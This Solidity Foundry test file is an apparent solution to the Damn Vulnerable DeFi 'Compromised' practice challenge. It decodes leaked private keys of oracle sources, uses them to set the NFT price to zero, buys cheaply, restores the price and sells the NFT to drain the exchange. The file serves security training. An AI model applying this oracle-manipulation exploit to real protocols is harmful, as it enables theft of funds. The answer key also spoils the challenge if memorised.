// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {Strings2} from "../../lib/murky/differential_testing/test/utils/Strings2.sol";
import {Base64} from "solady/utils/Base64.sol";
import {Strings} from "../../lib/openzeppelin-contracts/contracts/utils/Strings.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

contract CompromisedChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;


    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
        0xab3600bF153A316dE44827e2473056d56B774a40
    ];
    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;

    modifier checkSolved() {
        _;
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);

        // Initialize balance of the trusted source addresses
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        // Player starts with limited balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the oracle and setup the trusted sources with initial prices
        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
        nft = exchange.token();

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        for (uint256 i = 0; i < sources.length; i++) {
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(nft.owner(), address(0)); // ownership renounced
        assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_compromised() public checkSolved {
        bytes memory pk1Base64 = hex"4d4867335a444531596d4a684d6a5a6a4e54497a4e6a677a596d5a6a4d32526a4e324e6b597a566b4d574934595449334e4451304e4463314f54646a5a6a526b595445334d44566a5a6a5a6a4f546b7a4d44597a4e7a5130";
        bytes memory pk2Base64 = hex"4d4867324f474a6b4d444977595751784f445a694e6a5133595459354d574d325954566a4d474d784e5449355a6a49785a574e6b4d446c6b59324d304e5449304d5451774d6d466a4e6a426959544d334e324d304d545535";
        uint256 pk1 = parsePkBase64(pk1Base64);
        uint256 pk2 = parsePkBase64(pk2Base64);
        address source1 = vm.addr(pk1);
        address source2 = vm.addr(pk2);

        vm.prank(source1);
        oracle.postPrice("DVNFT", 0);
        vm.prank(source2);
        oracle.postPrice("DVNFT", 0);

        console.log(player);
        vm.prank(player);
        uint256 id = exchange.buyOne{value: 1 wei}();

        vm.prank(source1);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.prank(source2);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);

        vm.startPrank(player);
        nft.approve(address (exchange), id);
        exchange.sellOne(id);
        SafeTransferLib.safeTransferETH(recovery,INITIAL_NFT_PRICE);


    }

    function parsePkBase64(bytes memory base64) private pure returns(uint256){
        bytes memory hexString = Base64.decode(string(base64));
        // remove "0x"
        assembly{
            let length := mload(hexString)
            hexString := add(hexString, 2)
            mstore(hexString, sub(length, 2))
        }
        return hexStringToUint256(hexString);
    }
    /**
     *  hex string in bytes, this param can be defined as "string memory hexString"
     */
    function hexStringToUint256(bytes memory hexString) private pure returns (uint256 result){
        for(uint256 i = 0;i < hexString.length;i++){
            uint256 char = uint256(uint8(hexString[i]));
            uint256 value = hexCharToUint256(char);
            result = (result << 4) + value;
        }
    }

    function hexCharToUint256(uint256 char) private pure returns(uint256){
        if (char > 47 && char < 58) {
            return char - 48;
        } else if (char > 96 && char < 103){
            return char - 87;
        } else {
            revert('hex char invalid');
        }
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Exchange doesn't have ETH anymore
        assertEq(address(exchange).balance, 0);

        // ETH was deposited into the recovery account
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        assertEq(nft.balanceOf(player), 0);

        // NFT price didn't change
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
